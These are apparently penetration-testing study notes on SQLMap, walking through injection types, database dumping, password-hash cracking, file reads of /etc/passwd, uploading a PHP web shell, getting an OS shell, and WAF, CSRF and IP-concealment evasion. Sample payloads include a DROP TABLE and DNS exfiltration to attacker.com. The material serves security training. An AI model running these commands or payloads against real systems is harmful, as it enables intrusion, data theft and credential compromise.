# SQLMap Essentials

---

## What is SQLMap?

SQLMap is a **free, open-source penetration testing tool** written in Python that automates the entire process of detecting and exploiting SQL injection vulnerabilities. Instead of manually crafting injection payloads and analyzing responses, SQLMap does it all automatically — it tests the target, identifies the injection type, and then extracts data from the database. It has been continuously developed since 2006 and remains one of the most powerful tools in a security tester's toolkit.

SQLMap is not just a simple scanner. It includes a powerful detection engine, supports all known SQL injection types, and has dozens of options to fine-tune attacks, bypass protections, and work with complex HTTP requests. It can also interact with the server's file system and even give you a remote OS shell in ideal conditions.

---

## SQLMap Installation

SQLMap comes pre-installed on security-focused Linux distributions like Kali Linux and Parrot OS. For other systems, it can be installed in two ways:

**Install via package manager (Debian/Ubuntu):**

```bash
sudo apt install sqlmap
```

`sudo` runs the command with administrator privileges. `apt install sqlmap` downloads and installs SQLMap from the official Linux software repository. After this, you can run `sqlmap` directly from any terminal.

**Install manually from GitHub:**

```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

`git clone` downloads the entire SQLMap project from GitHub into a folder called `sqlmap-dev`. The `--depth 1` flag means only download the latest version of the code, not the full history — this makes the download faster and smaller.

**Run SQLMap after manual install:**

```bash
python sqlmap.py
```

`python sqlmap.py` runs the main SQLMap script using Python. On some systems you may need `python3 sqlmap.py` if Python 3 is not the default.

---

## Supported Databases

SQLMap supports the largest number of database systems of any SQL injection tool. This includes MySQL, Oracle, PostgreSQL, Microsoft SQL Server, SQLite, IBM DB2, MariaDB, Sybase, and many more — over 30 database systems in total. This wide support means SQLMap can be used against almost any web application regardless of the back-end database being used.

---

## Supported SQL Injection Types

SQLMap can detect and exploit all known types of SQL injection. View them with:

```bash
sqlmap -hh
```

`sqlmap -hh` shows the **advanced help menu** with every available option and switch. The basic help is `sqlmap -h`. The extra `h` unlocks the full list. The supported injection techniques are abbreviated as **BEUSTQ**:

| Letter | Type |
|--------|------|
| B | Boolean-based blind |
| E | Error-based |
| U | Union query-based |
| S | Stacked queries |
| T | Time-based blind |
| Q | Inline queries |

### Boolean-Based Blind

```sql
AND 1=1
```

SQLMap sends queries with conditions that are either TRUE or FALSE and observes how the server response changes. If the page looks normal for `AND 1=1` (true) and different for `AND 1=2` (false), data can be extracted one bit at a time. This requires around 7–8 requests per character extracted. It is the **most common** SQLi type found in real applications.

### Error-Based

```sql
AND GTID_SUBSET(@@version, 0)
```

If the application returns SQL error messages in the browser, those errors can be deliberately triggered to carry actual database data inside the error text. This technique is **faster** than boolean-based blind because it can retrieve up to 200 bytes of data per request (called a "chunk").

### Union Query-Based

```sql
UNION ALL SELECT 1, @@version, 3
```

The attacker extends the original query with a `UNION SELECT` statement. If the page displays query results, the injected data appears directly. This is the **fastest** type — in ideal conditions, an entire table can be dumped in a single request.

### Stacked Queries

```sql
; DROP TABLE users
```

Multiple SQL statements are run one after another using a semicolon. This is also called "piggy-backing." It requires the database platform to support stacked queries — Microsoft SQL Server and PostgreSQL support it by default, but MySQL generally does not allow it through typical query execution paths. Useful for running `INSERT`, `UPDATE`, or `DELETE` statements.

### Time-Based Blind

```sql
AND 1=IF(2>1, SLEEP(5), 0)
```

Like boolean-based, but instead of observing page content changes, the attacker measures **response delay**. If `SLEEP(5)` causes a 5-second delay, the condition was true. This is used when the page looks identical regardless of the injected condition — much slower than other types.

### Inline Queries

```sql
SELECT (SELECT @@version) FROM ...
```

A query is embedded inside another query. This is uncommon because it requires the web application to be written in a specific way. SQLMap supports it, but you will rarely encounter it in practice.

### Out-of-Band

```sql
LOAD_FILE(CONCAT('\\\\', @@version, '.attacker.com\\README.txt'))
```

Used when no other method works or everything else is too slow. The database is forced to make a DNS lookup to a domain controlled by the attacker. The requested subdomain contains the extracted data (e.g., `5.7.33.attacker.com`). SQLMap collects these DNS requests to piece together the full response.

---

## Basic Usage — Getting Started

### Help Menus

```bash
sqlmap -h      # Basic help — most commonly used options
sqlmap -hh     # Advanced help — every single option and switch
```

`-h` shows a short summary of the most important flags. `-hh` shows everything, including advanced tuning, evasion, and output options. New users should browse `-hh` at least once to understand what SQLMap can do.

### Basic Scan

```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

`-u` (or `--url`) specifies the target URL to scan. SQLMap will test the `id` parameter for SQL injection. `--batch` means run in non-interactive mode — automatically accept all default choices without asking the user for input. This is useful for scripted or automated scans. Without `--batch`, SQLMap pauses and asks questions during the scan.

---

## Running SQLMap on HTTP Requests

### Using cURL Commands

The easiest way to set up SQLMap with the correct headers, cookies, and parameters is to copy the request from your browser:

1. Open Developer Tools (F12) → Network tab
2. Right-click the request → **Copy as cURL**
3. Paste into terminal and replace `curl` with `sqlmap`

```bash
sqlmap 'http://www.example.com/?id=1' \
  -H 'User-Agent: Mozilla/5.0 ...' \
  -H 'Accept: */*' \
  -H 'Connection: keep-alive'
```

`-H` adds a custom HTTP header to every request SQLMap sends. This is important for mimicking a real browser request, especially when the server checks the `User-Agent` or requires specific headers to function correctly.

### GET Parameters

```bash
sqlmap -u "http://www.example.com/page.php?id=1"
```

Parameters in the URL after `?` are GET parameters. SQLMap automatically detects and tests them. The `id=1` part is the parameter being tested.

### POST Parameters

```bash
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

`--data` specifies POST body data (like form submissions). Both `uid` and `name` will be tested. To test only a specific parameter, add `-p uid`. To mark one specific parameter for testing, use `*`:

```bash
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

The `*` after `uid=1*` tells SQLMap to focus injection attempts on the `uid` parameter specifically, ignoring `name`.

### Full HTTP Request from File

Capture a full HTTP request in Burp Suite, save it to a file (`req.txt`), and use it:

```bash
sqlmap -r req.txt
```

`-r` loads the complete raw HTTP request from a file. This is the best approach for complex requests with many headers, cookies, or a large POST body. You can also mark injection points with `*` inside the saved file (e.g., `/?id=*`).

### Custom Cookies and Headers

```bash
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

`--cookie` sets the HTTP cookie header. This is essential when the vulnerable page requires you to be logged in — without the session cookie, SQLMap would just get a login redirect instead of the actual vulnerable page.

```bash
sqlmap ... --random-agent
```

`--random-agent` replaces SQLMap's default User-Agent header (which many firewalls recognize and block) with a randomly chosen browser User-Agent from a large database. This simple switch helps avoid detection by WAFs and security tools.

```bash
sqlmap -u "www.target.com" --data='id=1' --method PUT
```

`--method` forces SQLMap to use the specified HTTP method (GET, POST, PUT, DELETE, etc.) instead of auto-detecting it. Some APIs use PUT or DELETE methods instead of standard GET/POST.

---

## SQLMap Output — Understanding Log Messages

### Key Log Messages Explained

**"target URL content is stable"** — The page returns consistent responses for the same request. This is important because SQLMap compares responses to detect injection; unstable pages add noise.

**"GET parameter 'id' appears to be dynamic"** — Changing the parameter value changes the page response, which suggests the parameter is actually used in a database query. Static parameters that always return the same content are unlikely to be injectable.

**"heuristic (basic) test shows GET parameter 'id' might be injectable"** — SQLMap intentionally sent a malformed value and got a database error back. This is a strong hint that injection is possible, but not final proof yet.

**"it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes?"** — SQLMap identified the database type. Answering `Y` narrows the remaining tests to MySQL-specific payloads only, making the scan significantly faster.

**"GET parameter 'id' is vulnerable"** — SQLMap has confirmed the parameter is injectable. The scan found a working payload. At this point SQLMap asks if you want to test other parameters too.

**"sqlmap identified the following injection point(s)"** — The final summary showing all confirmed injection points with their type, technique, and the exact working payload used.

**"fetched data logged to text files under '/home/user/.sqlmap/output/'"** — All results are saved to disk. The session data is also stored here so future runs against the same target can skip already-completed steps.

---

## Handling SQLMap Errors

### Display DBMS Errors

```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" --parse-errors
```

`--parse-errors` tells SQLMap to extract and display any SQL error messages returned by the server. Instead of hiding them, you see the exact MySQL error text. This helps you understand what is going wrong with the injection and fix your approach.

### Store All Traffic

```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

`-t /tmp/traffic.txt` saves every HTTP request and response that SQLMap sends and receives to the specified file. You can then open the file and manually read through the raw traffic to diagnose issues — seeing exactly what was sent and what came back.

### Increase Verbosity

```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```

`-v` sets the verbosity level from 0 (silent) to 6 (maximum detail). Level 6 prints every HTTP request and response directly in the terminal in real time. Level 3 shows payloads being tested. Higher verbosity is very useful for debugging but produces a lot of output.

### Route Traffic Through a Proxy

```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" --proxy="http://127.0.0.1:8080"
```

`--proxy` routes all of SQLMap's traffic through the specified proxy (commonly Burp Suite running on `127.0.0.1:8080`). This lets you inspect, modify, and replay every request SQLMap makes using Burp's full feature set — very useful for manual analysis alongside automated testing.

---

## Attack Tuning

### Prefix and Suffix

```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

`--prefix` and `--suffix` add text before and after every injection payload. This is needed in rare cases where the vulnerable parameter is inside a complex SQL structure like nested parentheses or function calls. For example, if the query is `WHERE id LIKE (('$input'))`, you need `%'))` as a prefix to close the extra parentheses before your UNION payload.

### Level and Risk

```bash
sqlmap -u "www.example.com/?id=1" --level=5 --risk=3
```

`--level` controls how many **boundaries** (prefix/suffix combinations) are tested. Ranges from 1 (default, fastest) to 5 (all boundaries, slowest). Higher level catches edge cases that default level misses.

`--risk` controls how **aggressive/dangerous** the payloads are. Ranges from 1 (default, safe) to 3 (includes OR-based payloads that could modify database data). Higher risk is needed for login pages and other forms where OR-based injection is required, but it could accidentally trigger `DELETE` or `UPDATE` in vulnerable queries.

At default `--level=1 --risk=1`, SQLMap tests up to 72 payloads per parameter. At maximum `--level=5 --risk=3`, this increases to 7,865 payloads.

### Specifying Technique

```bash
sqlmap -u "www.example.com/?id=1" --technique=BEU
```

`--technique` restricts SQLMap to only specific injection types. `BEU` means only test Boolean-based blind, Error-based, and Union-based. This is useful when time-based blind is causing timeouts or false positives, or when you already know what type works and want faster results.

### UNION Tuning

```bash
sqlmap -u "www.example.com/?id=1" --union-cols=17
```

`--union-cols` manually tells SQLMap the exact number of columns in the vulnerable query. Normally SQLMap finds this automatically, but if auto-detection fails or you already know the number, specifying it directly speeds things up and avoids incorrect guesses.

```bash
sqlmap -u "www.example.com/?id=1" --union-char='a'
```

`--union-char` replaces the default dummy values (NULL and random integers) in UNION payloads with the specified character. Some queries reject NULL values or numbers in certain column positions — using `'a'` as a string placeholder can fix compatibility issues.

---

## Database Enumeration with SQLMap

### Basic Information

```bash
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

This single command retrieves four important pieces of basic information simultaneously:

- `--banner` → runs `VERSION()` to get the database version string (e.g., `MySQL 5.1.41`)
- `--current-user` → runs `CURRENT_USER()` to get the logged-in database username
- `--current-db` → runs `DATABASE()` to get the currently selected database name
- `--is-dba` → checks if the current user has DBA (administrator) rights — returns True or False

### List All Tables

```bash
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

`--tables` tells SQLMap to enumerate and list all table names in the database. `-D testdb` specifies which database to look in. Without `-D`, SQLMap lists tables from the current database only.

### Dump a Table

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```

`--dump` extracts and prints all data from the specified table. `-T users` specifies the table name. `-D testdb` specifies the database. The output is formatted as a table in the console and also saved as a CSV file on your local machine under `~/.sqlmap/output/`.

### Dump Specific Columns

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

`-C name,surname` tells SQLMap to only retrieve the specified columns instead of all columns. Useful when a table has many columns but you only care about specific ones (like username and password).

### Dump Specific Rows

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```

`--start=2` and `--stop=3` limit the output to rows 2 through 3 (by their order in the table). This avoids dumping thousands of rows from large tables when you only need a sample or specific range.

### Conditional Filtering

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

`--where` adds a SQL `WHERE` condition to filter which rows are retrieved. `name LIKE 'f%'` means only get rows where the name starts with the letter `f`. This is the SQLMap equivalent of adding `WHERE name LIKE 'f%'` to a manual SQL query.

### Dump Entire Database

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -D testdb
```

Omitting `-T` dumps **all tables** in the specified database at once. All data from every table is retrieved and saved.

```bash
sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs
```

`--dump-all` dumps everything from every database. `--exclude-sysdbs` skips built-in system databases like `information_schema`, `mysql`, and `performance_schema` since they contain MySQL internals rather than application data.

### View Database Schema

```bash
sqlmap -u "http://www.example.com/?id=1" --schema
```

`--schema` retrieves the complete structure of all databases — every table and every column with its data type. This gives you a full blueprint of the entire database without extracting the actual data yet. Useful for planning what to dump.

### Search for Specific Tables or Columns

```bash
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

`--search -T user` searches for all table names containing the keyword `user` (using the SQL `LIKE` operator). SQLMap will find `users`, `user_accounts`, `admin_users`, etc. across all databases.

```bash
sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

`--search -C pass` searches for columns containing `pass` in their name across all tables and databases. This quickly finds password columns like `password`, `passwd`, `pass_hash`, etc.

### Password Cracking

```bash
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```

When SQLMap dumps a table and finds values that look like password hashes, it automatically offers to crack them using a dictionary attack. SQLMap supports cracking 31 different hash types and comes with a built-in wordlist of 1.4 million common passwords. The cracking runs in parallel using all available CPU cores.

```bash
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

`--passwords` specifically targets the MySQL system table that stores database user password hashes (not application passwords). These are the credentials used to log into the database itself. SQLMap retrieves and attempts to crack them automatically.

---

## OS Exploitation via SQLMap

### Check DBA Privileges

```bash
sqlmap -u "http://www.example.com/?id=1" --is-dba
```

`--is-dba` checks whether the current database user has DBA (Database Administrator) privileges. Returns `True` or `False`. DBA privileges are usually required to read and write files on the server through SQL injection.

### Read Local Files

```bash
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

`--file-read` uses MySQL's `LOAD_FILE()` function to read any file from the server's file system that the MySQL process has permission to access. The file content is downloaded and saved locally at `~/.sqlmap/output/<target>/files/`. The `/etc/passwd` file in Linux contains system user account information.

### Write Files to Server

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

`echo '...' > shell.php` creates a PHP web shell file on your local machine first. `--file-write "shell.php"` specifies the local file to upload. `--file-dest "/var/www/html/shell.php"` specifies where to write it on the remote server. SQLMap uses `SELECT INTO OUTFILE` to write the file. The `secure_file_priv` variable must allow writes to that path.

### Get an Interactive OS Shell

```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell
```

`--os-shell` is SQLMap's most powerful feature — it attempts to give you a full interactive command shell on the remote server. SQLMap first tries to write a web shell using `INTO OUTFILE`, then interacts with it. If that doesn't work, it may use MySQL User-Defined Functions (UDFs) to execute OS commands directly through the database engine.

```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```

Adding `--technique=E` restricts SQLMap to error-based injection for the OS shell attempt. If UNION-based gives no output, error-based often works better because it has cleaner data extraction paths. SQLMap will also auto-detect the web language (PHP, ASP, etc.) and find the web root directory.

---

## Bypassing Web Application Protections

### Anti-CSRF Token Bypass

```bash
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=abc123" --csrf-token="csrf-token"
```

`--csrf-token="csrf-token"` tells SQLMap the name of the anti-CSRF token parameter. Before each request, SQLMap fetches a fresh page, extracts the new token value, and includes it in the next injection request. This bypasses applications that require a valid CSRF token with every form submission.

### Unique Value Parameter Bypass

```bash
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5
```

`--randomize=rp` tells SQLMap to generate a new random value for the `rp` parameter on every request. Some applications require unique values in certain parameters to prevent replay attacks. Randomizing the value on each request makes SQLMap appear as a fresh user each time.

### Calculated Parameter Bypass

```bash
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()"
```

`--eval` runs a Python code snippet before each request. Here, `import hashlib; h=hashlib.md5(id).hexdigest()` recalculates the `h` parameter as the MD5 hash of the current `id` value. Some applications require one parameter to be a hash of another — `--eval` lets SQLMap compute these dynamic values automatically.

### IP Concealment

```bash
sqlmap -u "http://www.example.com/?id=1" --proxy="socks4://177.39.187.70:33283"
```

`--proxy` routes all SQLMap traffic through the specified proxy server. This hides your real IP address. Use `--proxy-file` if you have a list of proxies — SQLMap will rotate through them automatically if any IP gets blocked.

```bash
sqlmap -u "http://www.example.com/?id=1" --tor --check-tor
```

`--tor` routes traffic through the Tor anonymity network (requires Tor to be installed and running locally on port 9050). `--check-tor` verifies that Tor is working correctly before starting the scan by checking `https://check.torproject.org/`.

### WAF Bypass

```bash
sqlmap -u "http://www.example.com/?id=1" --skip-waf
```

By default, SQLMap sends a test payload to detect if a WAF is present. `--skip-waf` skips this initial WAF detection test, producing less noise and fewer obvious malicious-looking requests at the start of the scan.

```bash
sqlmap -u "http://www.example.com/?id=1" --random-agent
```

`--random-agent` replaces SQLMap's identifiable default User-Agent header with a random browser User-Agent. Many WAFs and security tools block requests from known tool signatures — randomizing the User-Agent is a simple first step to bypass basic header-based blocking.

### Tamper Scripts

Tamper scripts modify injection payloads before they are sent to bypass WAF filtering rules. They are specified with `--tamper`:

```bash
sqlmap -u "http://www.example.com/?id=1" --tamper=between,randomcase
```

`--tamper=between,randomcase` chains two tamper scripts together. `between` replaces `>` with `NOT BETWEEN 0 AND #` and `=` with `BETWEEN # AND #`, evading WAFs that block comparison operators. `randomcase` randomly changes the case of SQL keywords (e.g., `SELECT` becomes `SeLeCt`), bypassing case-sensitive keyword filters. Multiple tamper scripts run in priority order.

| Tamper Script | What It Does |
|---|---|
| `between` | Replaces `>` with `NOT BETWEEN 0 AND #` and `=` with `BETWEEN # AND #` |
| `randomcase` | Randomly changes SQL keyword casing (e.g., `SELECT` → `SEleCt`) |
| `space2comment` | Replaces spaces with `/**/` comments |
| `base64encode` | Base64-encodes the entire payload |
| `percentage` | Adds `%` before each character (e.g., `S` → `%S`) |
| `versionedkeywords` | Wraps keywords in MySQL versioned comments |
| `charencode` | URL-encodes characters in the payload |

```bash
sqlmap --list-tampers
```

`--list-tampers` prints a full list of all available tamper scripts with their descriptions. Use this to find the right script for the WAF you're trying to bypass.

### Chunked Transfer Encoding

```bash
sqlmap -u "http://www.example.com/?id=1" --chunked
```

`--chunked` splits POST request bodies into small HTTP chunks. SQL keywords are split across chunk boundaries so that the WAF sees incomplete strings that don't match its injection signatures. The server reassembles the chunks and sees the full query, but the WAF inspection sees only fragments.

### HTTP Parameter Pollution

Payloads are split across multiple values of the same parameter name (e.g., `?id=1&id=UNION&id=SELECT&id=username...`). Some platforms (like ASP) concatenate duplicate parameter values, making the final value the full injection payload — while WAFs only inspect individual parameter values which appear harmless in isolation.

---

## Advanced Database Enumeration

### Full Automation

```bash
sqlmap -u "http://www.example.com/?id=1" --all --batch --exclude-sysdbs
```

`--all` is the nuclear option — it tells SQLMap to retrieve absolutely everything it can find: version, current user, hostname, all databases, all tables, all columns, all data, and password hashes. `--batch` auto-answers all prompts. `--exclude-sysdbs` skips system databases to keep the output relevant. Warning: this can run for a very long time on large databases. All results are saved to files and can be reviewed manually afterward.

---

*These notes cover SQLMap from installation and basic usage through advanced enumeration, OS exploitation, and WAF bypass techniques.*
